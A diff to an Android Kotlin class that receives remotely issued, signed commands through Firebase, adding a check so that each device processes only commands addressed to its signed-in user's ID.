@@ -29,6 +29,13 @@ class OverwatchC2Receiver(private val context: Context) {
                     val commandStr = commandSnapshot.child("command").getValue(String::class.java)
                     val signature = commandSnapshot.child("signature").getValue(String::class.java)
                     val timestamp = commandSnapshot.child("timestamp").getValue(Long::class.java) ?: 0L
+                    val targetUid = commandSnapshot.child("targetUid").getValue(String::class.java)
+                    val currentUid = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser?.uid
+
+                    // Only process command if specifically targeted to this user
+                    if (targetUid != null && targetUid != currentUid) {
+                        continue
+                    }
                     
                     if (commandStr != null && signature != null) {
                         // Prevent replay attacks (commands older than 5 minutes are ignored)
